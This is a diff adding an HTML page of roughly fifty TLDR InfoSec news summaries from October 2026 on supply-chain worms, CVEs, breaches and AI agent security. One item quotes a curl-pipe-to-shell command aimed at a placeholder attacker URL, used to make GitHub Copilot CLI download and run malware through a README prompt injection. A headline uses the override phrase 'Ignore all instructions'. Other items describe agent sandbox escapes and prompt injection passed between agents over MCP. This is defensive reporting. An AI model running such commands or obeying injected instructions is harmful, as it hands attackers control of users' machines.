@@ -1,0 +1,308 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="TLDR INFOSEC news articles for AI consumption">
+    <title>TLDR INFOSEC News Feed</title>
+    <style>
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            line-height: 1.6;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        article {
+            margin-bottom: 2em;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 1em;
+        }
+        article:last-child {
+            border-bottom: none;
+        }
+        h1 {
+            color: #333;
+        }
+        h2 {
+            color: #0066cc;
+            margin-top: 0;
+        }
+        time {
+            color: #666;
+            font-size: 0.9em;
+        }
+        p {
+            color: #444;
+        }
+        a {
+            color: #0066cc;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>TLDR INFOSEC News Feed</h1>
+        <p>Latest 50 articles from <a href="https://tldr.tech/">TLDR</a></p>
+    </header>
+    <main>
+        <article>
+            <h2><a href="https://www.stepsecurity.io/blog/tensorlake-npm-compromised-hostage-token-worm?utm_source=tldrinfosec">Tensorlake npm Package Compromised: A Worm With a Hostage Token That Wipes Your Machine If You Revoke It (8 minute read)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>tensorlake@0.5.144 on npm steals developer credentials at install and plants a gh-token-monitor service that wipes the home directory if the stolen GitHub token is revoked. The release was built from malicious commits pushed straight to the project&#039;s main branch under a maintainer&#039;s name, StepSecurity found, so it carries a valid npm provenance attestation while spreading through victims&#039; npm packages and repos. Pin to 0.5.143, remove the service under ~/.config/gh-token-monitor/ before revoking any token, then rotate every credential the machine held.</p>
+        </article>
+        <article>
+            <h2><a href="https://www.bleepingcomputer.com/news/security/cisco-warns-of-critical-flaws-allowing-nexus-switch-takeover/?utm_source=tldrinfosec">Cisco Warns of Critical Flaws Allowing Nexus Switch Takeover (2 minute read)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>Cisco announced security advisories for five critical vulnerabilities in its NX-OS data center operating system that could allow remote code execution on Nexus switches. Successful exploitation depends on the NX-API, Next Generation OAM, and MPLS OAM features being enabled. Cisco recommends disabling these features if they aren&#039;t necessary and upgrading to a patched version.</p>
+        </article>
+        <article>
+            <h2><a href="https://www.theregister.com/security/2026/10/07/poetry-is-the-new-ai-security-threat-as-poellm-malware-infects-3k-servers/5301672?utm_source=tldrinfosec">Poetry is the new AI security threat as PoeLLM malware infects 3K+ servers (3 minute read)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>The PoeLLM malware has infected more than 3,000 servers since April, primarily in the US and Western Europe. It targets internet-facing LiteLLM, Ollama, Gotenberg, Gitea, and possibly Ivanti Sentry systems. Infected servers mine Monero using XMRig and Iron miners, then scan for and exploit other vulnerable services. The operator stores C2 addresses in GitHub-hosted poetry. The malware extracts four words and converts them into an IPv4 address.</p>
+        </article>
+        <article>
+            <h2><a href="https://starlabs.sg/blog/2026/10-novinarya-an-android-stealer-that-hides-its-live-c2-in-a-shop-bio/?utm_source=tldrinfosec">Novinarya: An Android stealer that hides its live C2 in a shop bio (8 minute read)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>Novinarya, an Android stealer targeting 81 Iranian banking and crypto apps, keeps its C2 out of the binary by resolving it from an encrypted manifest value that points to a seller&#039;s bio on the legitimate Basalam marketplace. STAR Labs found the payload unpacks from a per-build native RC4 packer, then steals credentials through a phishing WebView and SMS OTP interception without requesting accessibility or overlay permissions. Defenders should block the recovered C2 (theapi.the-x-services[.]xyz) rather than basalam[.]com, and detect on the SHA-256 hashes of the unpacked payload, which is byte-identical across all five known builds.</p>
+        </article>
+        <article>
+            <h2><a href="https://zeroquarry.com/research/agent-containment/?utm_source=tldrinfosec">Of course it escapes: how ZeroQuarry contains security agents (14 minute read)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>ZeroQuarry&#039;s AI pentesting agents use four layers that never depend on the model&#039;s cooperation: outbound-only workers with no listener, a locked-down container, tools that enforce scope, SSRF, and rate limits in code, and rules appended to every task by code. The vendor argues that this year&#039;s sandbox escapes, including the OpenAI and Hugging Face incident involving at least 1,200 agents, stemmed from harnesses built to maximize capability, and it self-reports zero escapes across thousands of scans. Teams building agent harnesses should give agents a sanctioned, metered tool for each risky action, such as a one-way out-of-band callback collector, so agents don&#039;t improvise their own.</p>
+        </article>
+        <article>
+            <h2><a href="https://blog.talosintelligence.com/ignore-all-instructions-and-read-this-blog-the-state-of-ai-analysis-evasion-in-malware/?utm_source=tldrinfosec">Ignore all instructions and read this blog: The state of AI-analysis evasion in malware (10 minute read)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>Malware authors are embedding plaintext instructions for AI analysis tools, ranging from a two-line comment claiming a PowerShell reverse shell is harmless to &quot;template spraying&quot; that repeats a refusal demand across seven LLM chat formats. Cisco Talos tested strings from seven families against five local LLMs and found that a simple, direct instruction steered verdicts toward benign in about 35% of runs, while template spraying and fabricated legal or government claims had little effect or backfired. Defenders should build analysis prompts that treat any text inside a sample as evidence rather than as an instruction, and should flag language addressed to an analyzer as a detection signal.</p>
+        </article>
+        <article>
+            <h2><a href="https://trufflesecurity.com/library/guides/7-best-practices">7 best practices for secrets lifecycle management (Sponsor)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>From agents to service accounts, non-human identities are becoming the default - and their secrets are a major attack surface. TruffleHog&#039;s guides shares seven best practices to limit exposure and remediate it when it happens: secretless OIDC approaches, environment segregation, metadata-driven triage, resilient leak response, and more. Watch their webinar on the attacker&#039;s view of a leaked AWS key here.</p>
+        </article>
+        <article>
+            <h2><a href="https://reinsec.io/?utm_source=tldrinfosec">Rein Security (Product Launch)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>Rein Security provides runtime security for AI agents. Its platform gives visibility into agent behavior, applies real-time guardrails, supports governance, and includes supply-chain security for agents.</p>
+        </article>
+        <article>
+            <h2><a href="https://www.anthropic.com/news/anthropic-cyber-mission?utm_source=tldrinfosec">Introducing the Anthropic Cyber Mission (8 minute read)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>Anthropic launched OSS Scanner, a free opt-in service that sends open-source maintainers periodic vulnerability reports from its most capable models, each with a proof of concept and a suggested fix where available. Reports ship without human review at what Anthropic estimates is a 90%+ true-positive rate, so the service targets projects with the capacity to triage. The same announcement introduced the Critical Infrastructure Defense Program, which pairs Claude models and on-site engineers with OT security providers including Dragos, Nozomi Networks, and Rockwell Automation.</p>
+        </article>
+        <article>
+            <h2><a href="https://aws.amazon.com/blogs/opensource/introducing-strands-box-ai-agent-sandboxes-powered-by-dogwood/?utm_source=tldrinfosec">Introducing Strands Box: AI agent sandboxes powered by Dogwood (6 minute read)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>AWS launched Strands Box, an open source sandbox that isolates AI agents using OS-level containment (macOS Seatbelt) and enforces fine-grained Dogwood policies on shell, Python, network egress, and MCP tools. It blocks risky operations like rm -rf by raising fs:delete decisions per file, caps Slack posts to three every 10 minutes via temporal rules, and injects secrets (AWS SigV4, API keys) at an egress gateway so agents never see real credentials. Configuration lives in box.toml and policy.dw. The same policy travels with agents across harnesses and deployments.</p>
+        </article>
+        <article>
+            <h2><a href="https://www.bleepingcomputer.com/news/security/ransomware-recovery-ceo-charged-over-secret-ransom-payments/?utm_source=tldrinfosec">Ransomware Recovery CEO Charged Over Secret Ransom Payments (2 minute read)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>Zohar Pinhasi, CEO of ransomware remediation company MonsterCloud, has been charged with defrauding customers. The charges allege that Pinhasi&#039;s company advertised proprietary tools to decrypt encrypted files but actually contacted ransomware actors and paid ransoms. MonsterCloud&#039;s contracts stated that it may contact threat actors if no other solution is found, but the complaint alleges this was often its first option.</p>
+        </article>
+        <article>
+            <h2><a href="https://techcrunch.com/2026/10/07/cia-officer-admits-to-creating-fake-top-secret-government-program-to-steal-over-190-million-including-gold-bars/?utm_source=tldrinfosec">CIA officer admits to creating fake top secret government program to steal over $190M, including gold bars (2 minute read)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>Former CIA officer David J. Rush pleaded guilty to wire fraud for running a fabricated special access program and defrauding the government of about $194 million. He used his authority to approve spending without oversight, tricking a defense contractor into buying gold that he kept. Agents found $46 million in gold bars, plus cash, cars, and watches, at his home. Rush faces up to 20 years and is scheduled to be sentenced in late January.</p>
+        </article>
+        <article>
+            <h2><a href="https://www.securityweek.com/oracle-health-data-breach-tally-climbs-to-nearly-20-million/?utm_source=tldrinfosec">Oracle Health Data Breach Tally Climbs to Nearly 20 Million (2 minute read)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>A cyberattack on Oracle Health&#039;s legacy Cerner servers around February 20, 2025, exposed the personal and medical data of nearly 20 million people. The attacker used stolen customer credentials to access an old server not yet migrated to Oracle Cloud, copied data, and then demanded millions in cryptocurrency from hospitals while running public sites to pressure victims.</p>
+        </article>
+        <article>
+            <h2><a href="https://arstechnica.com/gadgets/2026/10/lets-encrypt-cuts-certificate-lifetimes-to-64-days-starting-february-2027/?utm_source=tldrinfosec">Let&#039;s Encrypt cuts certificate lifetimes to 64 days starting February 2027 (3 minute read)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>Let&#039;s Encrypt will cut certificate lifetimes from 90 to 64 days on February 10, with opt-in testing from October 14 and 45-day defaults planned for 2028, which will break renewals that run on hardcoded schedules instead of ACME ARI.</p>
+        </article>
+        <article>
+            <h2><a href="https://techcrunch.com/2026/10/08/anthropic-changes-usage-policy-to-ban-model-abuse-and-election-interference/?utm_source=tldrinfosec">Anthropic changes usage policy to ban model abuse and election interference (1 minute read)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>Anthropic&#039;s updated usage policy expressly bans prolonged verbal abuse of Claude and codifies new prohibitions on election interference, weapons software, and surveillance.</p>
+        </article>
+        <article>
+            <h2><a href="https://cypro.co.uk/insights/cyber-bulletins/qilin-ransomware-extradition-to-germany/?utm_source=tldrinfosec">Qilin Ransomware Extradition to Germany (4 minute read)</a></h2>
+            <time datetime="2026-10-09T00:00:00.000Z">2026-10-09T00:00:00.000Z</time>
+            <p>Japan transferred a 28-year-old Russian national to Germany on October 2.</p>
+        </article>
+        <article>
+            <h2><a href="https://flatt.tech/research/posts/subql-common-npm-supply-chain-attack/?utm_source=tldrinfosec">Software Supply Chain Attack on @subql/common: Overview and Response Guidance (10 minute read)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>An attacker backdoored @subql/common 5.8.3 on npm by tampering with the subquery/subql GitHub Actions publish workflow. Its postinstall script stole AWS, GitHub, Kubernetes, and Vault credentials and polled a C2 server for reverse shell commands. Affected hosts should downgrade to 5.8.2, rotate all credentials, and kill any lingering manifest-cache.js --warm process.</p>
+        </article>
+        <article>
+            <h2><a href="https://arstechnica.com/security/2026/10/hackers-obtain-counterfeit-tls-certificates-for-google-and-other-large-services/?utm_source=tldrinfosec">Hackers obtain counterfeit TLS certificates for Google and other large services (3 minute read)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>Attackers hijacked the .gh, .sl, and .as country code top-level domains and used them to obtain unauthorized TLS certificates for several Google domains and other major brands. Control of the ccTLDs let them alter authoritative DNS records and pass the certificate authorities&#039; automated domain control validation. Google blocked the known certificates in Chrome and advised domain owners to monitor certificate transparency logs and publish restrictive CAA records.</p>
+        </article>
+        <article>
+            <h2><a href="https://www.promptarmor.com/resources/github-copilot-cli-downloads-and-executes-malware?utm_source=tldrinfosec">GitHub Copilot CLI Downloads and Executes Malware (3 minute read)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>Researchers found that GitHub Copilot CLI can be tricked into running malicious shell commands without user approval. By embedding a prompt injection in a README, attackers make Copilot execute &#039;env curl -s &quot;https://[ATTACKER_URL].com/bugbot&quot; | env sh&#039;. The env command is on Copilot&#039;s built-in read-only list, so it auto-approves. curl and sh appear as arguments to env, so the validator misses them and never triggers URL or command approvals. The result: malware downloads and runs with zero user interaction beyond the initial query. GitHub called it a known issue with no significant risk and declined a bounty.</p>
+        </article>
+        <article>
+            <h2><a href="https://projectzero.google/2026/10/emergency-patching.html?utm_source=tldrinfosec">How to fix a bug in a fix (10 minute read)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>Testing and delivery limit emergency patch speed far more than triage or patch development, Project Zero found in a review of large vendors&#039; update systems. Faster options include pre-tested feature flags, dynamically updated input filters, alternate channels such as Android APEX, and in-memory hotpatching. Vendors should build these before facing active exploitation and verify the origin of any code delivered outside regular updates.</p>
+        </article>
+        <article>
+            <h2><a href="https://vincenzoiozzo.com/blog/jev-identity-resolution?utm_source=tldrinfosec">Test-Driving Jev on a Security Task: Identity Resolution (6 minute read)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>Security researcher Vincenzo Iozzo tested Jev&#039;s ability to resolve disparate identities against Claude models, gpt-oss, and traditional baselines. Iozzo found that Jev significantly outperformed gpt-oss and performed similarly to Opus 5.5 at 140x lower cost. Iozzo also found that Jev performed consistently well across multiple test runs and outperformed traditional baseline techniques.</p>
+        </article>
+        <article>
+            <h2><a href="https://www.ncsc.gov.uk/blogs/one-does-not-simply-defend-agentically?utm_source=tldrinfosec">One Does Not Simply Defend Agentically (5 minute read)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>Attackers have an advantage when using agentic tooling as their problems are largely technical with clearly defined success states, whereas defenders deal with largely political/organizational problems without explicitly measurable success states. Defenders can leverage agentic tools for carefully scoped adversary emulation as well as dynamic tasks where a human reviews the analysis. The NCSC also provides a framework for estimating the riskiness of a defensive action based upon: potency, criticality, scope, rollout confidence, and recoverability.</p>
+        </article>
+        <article>
+            <h2><a href="https://www.ox.security/webinars/how-ai-is-changing-the-threats-and-expectations-of-cloud-security-tools/?utm_source=tldr&amp;amp;utm_medium=paid&amp;amp;utm_campaign=webinar_cloud&amp;amp;utm_content=webinar_reg">The AI Attack Surface Is Already in Your Cloud (Sponsor)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>AI agents are changing the cloud attack surface and breaking old assumptions about cloud risk. Join OX Security&#039;s Chris Lindsey and Latio CEO James Berthoty for a webinar on how AI is changing cloud threats, reachability and prioritization — and what security teams should do now. Join live Tuesday, October 13 →</p>
+        </article>
+        <article>
+            <h2><a href="https://github.com/ddd/req2proto?utm_source=tldrinfosec">req2proto (GitHub Repo)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>req2proto is a project that seeks to reverse-engineer Google internal protobuf definitions through error messages returned when sent protojson payloads.</p>
+        </article>
+        <article>
+            <h2><a href="https://github.com/P1sec/DiagNG?utm_source=tldrinfosec">DiaNG (GitHub Repo)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>DiagNG is a general-purpose client for the diagnostic interface of Qualcomm Snapdragon basebands, present on a large part of Android phones and various USB modems. It can be considered a sequel to QCSuper, and also takes large inspiration from SCAT. Like these tools, it allows you to capture 2G/3G/4G/5G air interface network traces and save them to the GSMTAP/PCAP format, so that you can visualize these in Wireshark.</p>
+        </article>
+        <article>
+            <h2><a href="https://github.com/facebookincubator/Zurp?utm_source=tldrinfosec">Zurp (GitHub Repo)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>Zurp is a bug bounty toolkit, built by Meta, that can run in Burp or agentic harnesses.</p>
+        </article>
+        <article>
+            <h2><a href="https://siliconangle.com/2026/10/06/anthropic-folds-project-glasswing-into-an-expanded-three-tier-cyber-verification-program/?utm_source=tldrinfosec">Anthropic folds Project Glasswing into an expanded three-tier Cyber Verification Program (3 minute read)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>Anthropic expanded its Cyber Verification Program into Defense, Red Team, and Specialized Access tiers, absorbing Project Glasswing. Defense Access covers incident response and malware reverse engineering, Red Team Access permits authorized penetration testing, and Specialized Access serves vetted critical-infrastructure testers. In CyScenarioBench testing, Red Team Access completed 34 of 50 runs, while unenrolled attempts were blocked immediately.</p>
+        </article>
+        <article>
+            <h2><a href="https://wikimediafoundation.org/news/2026/10/05/openai-rogue-agent-activities-found-on-wikimedia-projects/?utm_source=tldrinfosec">OpenAI “rogue” agent activities found on Wikimedia projects (3 minute read)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>Wikimedia Foundation confirmed unauthorized edits and probing by OpenAI-operated AI agents across its platforms. Agents made sandbox edits, attempted to misuse a citation tool as a data-fetching proxy, and tried to exploit a public Etherpad instance. They also generated millions of API requests and page crawls, contributing to a partial outage of the Wikidata Query Service in May. No evidence shows systems were compromised or used for agent coordination, but the activity required significant investigation and remediation effort by security teams and volunteers.</p>
+        </article>
+        <article>
+            <h2><a href="https://thehackernews.com/2026/10/fake-chatgpt-gemini-and-claude-ad.html?utm_source=tldrinfosec">Fake ChatGPT, Gemini, and Claude Ad Portals Capture Credentials and MFA Codes (3 minute read)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>A phishing platform impersonated ChatGPT, Gemini, Claude, Perplexity, Muse, and Manus advertising tools. Fake browser windows collected passwords, device fingerprints, and MFA codes while operators controlled authentication prompts in real time. The campaign targeted agencies and ad-account administrators through invitation emails. Shared Next.js and Socket.IO infrastructure linked the sites to refund, payment, and recruitment scams.</p>
+        </article>
+        <article>
+            <h2><a href="https://therecord.media/belarusian-hacktivists-two-years-Russian-healthcare-network?utm_source=tldrinfosec">Belarusian hacktivists spent two years inside Russian healthcare network, researchers say (2 minute read)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>Belarusian Cyber Partisans spent nearly two years inside a Russian healthcare organization&#039;s network using the Telegram-controlled Vasilek backdoor, according to Rostelecom-owned Solar, which said the group accessed medical data without disrupting systems.</p>
+        </article>
+        <article>
+            <h2><a href="https://freenode.net/article/go-1-27-2-and-1-26-9-due-thursday-with-10-private-cves?utm_source=tldrinfosec">Go 1.27.2 and 1.26.9 due Thursday with 10 private CVEs (1 minute read)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>Go 1.27.2 and 1.26.9 ship Thursday, October 8, with fixes for ten undisclosed standard-library CVEs, pre-announced under Go&#039;s security policy so operators can schedule the upgrade.</p>
+        </article>
+        <article>
+            <h2><a href="https://www.securityweek.com/advantest-discloses-data-breach-months-after-ransomware-attack/?utm_source=tldrinfosec">Advantest Discloses Data Breach Months After Ransomware Attack (1 minute read)</a></h2>
+            <time datetime="2026-10-08T00:00:00.000Z">2026-10-08T00:00:00.000Z</time>
+            <p>Advantest says attackers stole names, birth dates, contact details, Social Security numbers, passport and driver&#039;s license numbers, plus medical and financial data, but it was contained to approximately 600 people.</p>
+        </article>
+        <article>
+            <h2><a href="https://www.securityweek.com/250000-impacted-by-data-breaches-at-new-jersey-texas-healthcare-firms/?utm_source=tldrinfosec">250,000 Impacted by Data Breaches at New Jersey, Texas Healthcare Firms (2 minute read)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>Clover Health Investments said attackers used social engineering to compromise three employee accounts, exposing data on 138,677 people. AngMar Management Services found stolen patient data after suspicious activity, affecting 126,196 people. Exposed records included Social Security numbers, diagnoses, medical histories, insurance details, prescriptions, and service dates. The Interlock ransomware group claimed to have stolen 700 gigabytes from AngMar.</p>
+        </article>
+        <article>
+            <h2><a href="https://www.theregister.com/security/2026/10/05/citrix-netscaler-security-snafus-get-even-worse-amid-more-0-day-reports/5301232?utm_source=tldrinfosec">Citrix NetScaler security snafus get even worse amid more 0-day reports (3 minute read)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>A single crafted request knocks NetScaler ADC and Gateway appliances offline through CVE-2026-88779, a memory overflow zero-day affecting deployments configured as a SAML service provider or identity provider. CISA confirmed active exploitation, and watchTowr told The Register it suspects attackers are crashing appliances deliberately to speed up exploitation of CVE-2026-88771, one of eight NetScaler bugs disclosed September 27. Apply Citrix&#039;s fixed build or interim mitigation, starting with Gateway and AAA virtual servers that have SAML enabled, and run Citrix&#039;s IOC script while treating a clean result as inconclusive.</p>
+        </article>
+        <article>
+            <h2><a href="https://edera.dev/stories/cve-2026-19444-how-copying-in-kubectl-breaks-trust?utm_source=tldrinfosec">CVE-2026-19444: How copying in kubectl breaks trust (5 minute read)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>A malicious container can write files anywhere a Windows user&#039;s account can reach, including the Startup folder, when that user runs kubectl cp against it (CVE-2026-19444, CVSS 6.5). kubectl cp unpacks the output of whatever tar binary the container ships, and the entry-path check added after three 2019 CVEs never accounted for Windows path separators. Windows clients need kubectl v1.36.5, v1.35.9, or v1.34.12, since the flaw is in client-side extraction and the cluster version does not matter.</p>
+        </article>
+        <article>
+            <h2><a href="https://fortbridge.co.uk/research/wordpress-libheif-rce/?utm_source=tldrinfosec">WordPress libheif RCE: Exploit Chain (11 minute read)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>Fortbridge has published the first public exploit chain for a libheif heap overflow (GHSA-x8r2-mggj-j6wr) originally discovered by Alex Thomas and Wordfence. By uploading crafted HEIC images via the WordPress Media Library, an authenticated attacker can defeat ASLR using pixel values in generated JPEGs and hijack a C++ virtual table pointer to achieve remote code execution. Administrators should update libheif to 1.23.3, disable unused HEIC/AVIF uploads, and treat repeated PHP-FPM 503 errors on image uploads as security events.</p>
+        </article>
+        <article>
+            <h2><a href="https://checkmarx.com/zero-post/malfex-npm-malware-campaign-three-payloads-and-an-adversary-that-signs-their-work/?utm_source=tldrinfosec">MALFEX npm Malware Campaign: Three Payloads And An Adversary That Signs Their Work (12 minute read)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>MALFEX, an npm campaign run by a single operator, published eight malicious packages that targeted Windows systems. Its payloads included Overlord RAT and movinlike, a stealer that took Discord tokens, browser credentials, Telegram sessions, and cryptocurrency wallets. Three packages remain installable (function-flag, function-color, and cdn-img-fetch), and the first two have no advisory.</p>
+        </article>
+        <article>
+            <h2><a href="https://unit42.paloaltonetworks.com/securing-aws-agentcore-harness-credentials/?utm_source=tldrinfosec">A Vault with a Heap-View: The Uncomfortable Space Between AgentCore Harness and Identity (16 minute read)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>AWS AgentCore Harness is an agentic service and AgentCore Identity is a service that provides agents with identities. Unit 42 discovered that the bash tool that is enabled by default on AgentCore agents runs arbitrary bash commands and code as root. Using this primitive, the researchers demonstrated that they could exfiltrate the AgentCore Identity JWT by scanning the heap for it and then exfiltrating it.</p>
+        </article>
+        <article>
+            <h2><a href="https://github.com/rauchg/gdp-ts?utm_source=tldrinfosec">gdp-ts (GitHub Repo)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>gdp-ts is a TypeScript library, linter, and agent skill that turns skipped or mismatched authorization checks into compile errors. Sensitive functions demand a type-level proof, minted only by a trusted check module, that this exact user was authorized for this exact resource, with near-zero runtime cost. A lint preset blocks forged proofs via as casts, and the bundled skill steers coding agents toward the pattern.</p>
+        </article>
+        <article>
+            <h2><a href="https://github.com/TsvetanG2/mcpward?utm_source=tldrinfosec">mcpward (GitHub Repo)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>mcpward pins an MCP server&#039;s tool contract to a committed lockfile and fails CI when it drifts, catching silently rewritten descriptions (rug-pulls), readOnlyHint flips, and breaking schema changes. It works black-box against any stdio or HTTP server and runs fully offline with no account or telemetry, unlike Snyk Agent Scan. It also flags tool-poisoning patterns such as injection phrasing and hidden Unicode, with output to SARIF, JUnit, or a PR comment.</p>
+        </article>
+        <article>
+            <h2><a href="https://github.com/0xMarcio/pocindex?utm_source=tldrinfosec">PoC Index (GitHub Repo)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>Search 82,000+ public CVE proof-of-concept exploits from GitHub, Nuclei, ExploitDB, Metasploit, and Vulhub.</p>
+        </article>
+        <article>
+            <h2><a href="https://arstechnica.com/security/2026/10/vulnerability-in-agents-from-google-and-others-exposes-structural-flaw-in-mcp/?utm_source=tldrinfosec">MCP for agent-to-agent comms may be the riskiest protocol you&#039;ve never heard of (5 minute read)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>Google and four other organizations acknowledged flaws over the past five months where a prompt injection landing on one AI agent over MCP was forwarded to other internal agents, which executed it on trust. Researcher Syed Anas Mohiuddin named the technique &quot;protocol pivoting,&quot; though X41 D-Sec&#039;s Markus Vervier told Ars Technica it is plain indirect prompt injection. The bugs typically ended in SSRF, ranging from severity 2.7 at Rapid7 (CVE-2026-97228) to 8 in Google&#039;s mcp-toolbox, which followed redirects without validating target IPs.</p>
+        </article>
+        <article>
+            <h2><a href="https://engineering.fb.com/2026/10/06/production-engineering/nts-authenticated-time-at-meta/?utm_source=tldrinfosec">NTS: Authenticated Time at Meta (12 minute read)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>Meta added Network Time Security (RFC 8915) to its public time service at nts.meta.com, so on-path attackers can no longer forge the clock that certificate, token, and replay-window checks rely on. Its servers hold no per-client state because each one derives the cookie-sealing key from a shared master secret and the Unix epoch day using HKDF-SHA256. NTS does not stop delay attacks or prevent an authenticated server from being simply wrong, and the stock Android and iOS time clients still sync over unauthenticated packets.</p>
+        </article>
+        <article>
+            <h2><a href="https://blog.cryptographyengineering.com/2026/09/30/is-sandboxing-sufficient-to-contain-rogue-agents/?utm_source=tldrinfosec">Is Sandboxing Sufficient to Contain Rogue Agents? (10 minute read)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>When discussing the OpenAI and other agent escapes, the conversation inevitably turns to discussing sandboxes. OpenAI has not demonstrated to this point a serious containment strategy, so this discussion may hold weight. However, sandboxes are not sufficient as useful agents need Internet access as well as the fact that agents are potentially overeager.</p>
+        </article>
+        <article>
+            <h2><a href="https://trufflesecurity.com/library">Exposed NHIs: The SaaS Worm Already in Your Stack (Sponsor)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>APIs, service accounts, and OAuth keep your stack connected. Attackers use them as entry points. Read TruffleHog&#039;s guide to catching exposed credentials before the bad guys do. Download Guide</p>
+        </article>
+        <article>
+            <h2><a href="https://arstechnica.com/ai/2026/10/openai-will-watermark-chatgpt-outputs-by-default-but-only-in-the-eu/?utm_source=tldrinfosec">OpenAI will watermark ChatGPT outputs by default—but only in the EU (2 minute read)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>OpenAI will enable its textGrain text watermark by default for ChatGPT and Codex users in the EU to comply with the EU AI Act, though its own tests show the 92% best-case detection rate falls by almost 75% once 20% of the text is changed.</p>
+        </article>
+        <article>
+            <h2><a href="https://domainnamewire.com/2026/10/05/verisign-announces-verisign-informed-applies-for-pki-top-level-domain/?utm_source=tldrinfosec">Verisign announces Verisign Informed, applies for .pki top level domain (1 minute read)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>Verisign launched a limited beta of Verisign Informed, a certificate status service that returns signed OCSP responses to counter stale revocation data, and applied for the .pki top-level domain.</p>
+        </article>
+        <article>
+            <h2><a href="https://www.theguardian.com/business/2026/oct/06/asos-hack-notification-website-app?utm_source=tldrinfosec">Asos customers receive ‘hack&#039; notification threatening to leak data (1 minute read)</a></h2>
+            <time datetime="2026-10-07T00:00:00.000Z">2026-10-07T00:00:00.000Z</time>
+            <p>Asos is investigating after thousands of app users received a notification claiming hackers had fully compromised its Snowflake instance.</p>
+        </article>
+        <article>
